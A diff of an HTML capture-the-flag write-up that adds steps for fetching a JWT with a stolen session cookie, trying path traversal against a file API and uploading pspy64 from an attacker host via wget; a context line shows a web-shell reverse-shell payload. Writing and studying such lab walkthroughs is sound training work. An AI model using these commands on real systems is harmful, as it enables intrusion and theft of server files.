@@ -375,7 +375,27 @@ print(f<span class="cs">"{b64}.{sig}"</span>)</code></pre>
     <div class="s-num">04</div>
     <h2>JWT Forgery → File API Access</h2>
 
-    <p>The API at <code>/api/auth/token.php</code> issues JWTs for API access. Inside <code>auth.php</code> there's a comment that is, genuinely, one of the best things I've read in a CTF:</p>
+    <p>The API at <code>/api/auth/token.php</code> issues JWTs. We request one using robert's session cookie:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell — get token</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -s http://10.49.131.163/api/auth/token.php \
+  -H <span class="cs">"Cookie: nexus_session=&lt;robert_session&gt;"</span></code></pre>
+
+    <pre><code><div class="ph"><span class="pl">response</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+{
+  <span class="ca">"token"</span>: <span class="cs">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCAiZXhwIjoxNzM0MDAwMDAwfQ.&lt;sig&gt;"</span>
+}</code></pre>
+
+    <p>Decoding the payload section reveals <code>role: user</code>. We try the file API immediately:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell — test file API with user token</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -s http://10.49.131.163/api/files.php?name=../config.php \
+  -H <span class="cs">"Authorization: Bearer &lt;token&gt;"</span></code></pre>
+
+    <pre><code><div class="ph"><span class="pl">response</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cr">{"error":"Admin role required"}</span></code></pre>
+
+    <p>Role check on the API. We need admin. Time to look at how the token is verified. Via the file API we read <code>auth.php</code> — and inside it there's a comment that is, genuinely, one of the best things I've seen in a CTF:</p>
 
     <pre><code><div class="ph"><span class="pl">auth.php — vulnerable snippet</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
 <span class="ck">// Signature check intentionally disabled</span>
@@ -483,7 +503,24 @@ curl <span class="cs">"http://10.49.131.163/shell.php?cmd=bash+-c+'bash+-i+>%26+
     <div class="s-num">06</div>
     <h2>Password Reuse → devops</h2>
 
-    <p>As <code>www-data</code>, we run <code>pspy64</code> to watch for interesting processes. A root cron fires every minute running <code>/opt/monitoring/health_report.sh</code>. Noted — we'll come back to that.</p>
+    <p>First thing — drop <code>pspy64</code> on the target. It shows all running processes in real time without root privileges:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell — upload pspy64 to target</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># attack machine — serve the binary</span>
+python3 -m http.server 8000
+
+<span class="ck"># on the target (www-data shell)</span>
+wget http://&lt;ATTACKER_IP&gt;:8000/pspy64 -O /tmp/pspy64
+chmod +x /tmp/pspy64
+/tmp/pspy64</code></pre>
+
+    <p>Wait a minute and watch:</p>
+
+    <pre><code><div class="ph"><span class="pl">pspy64 output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+2024/10/22 14:01:01 CMD: <span class="cy">UID=0</span>   PID=1337 | <span class="cg">/bin/bash /opt/monitoring/health_report.sh</span>
+2024/10/22 14:02:01 CMD: <span class="cy">UID=0</span>   PID=1351 | <span class="cg">/bin/bash /opt/monitoring/health_report.sh</span></code></pre>
+
+    <p>UID=0, every minute, on the dot. That script is going on our list. We'll come back to it.</p>
 
     <p>But first, a simpler path. <code>/opt/admin_bot.py</code> is world-readable and has permissions <code>rwxrwxrwx</code>. Inside it, the DB password is hardcoded. Remember the <code>system_user</code> from the encrypted config back in Step 2? <code>devops</code>.</p>
 
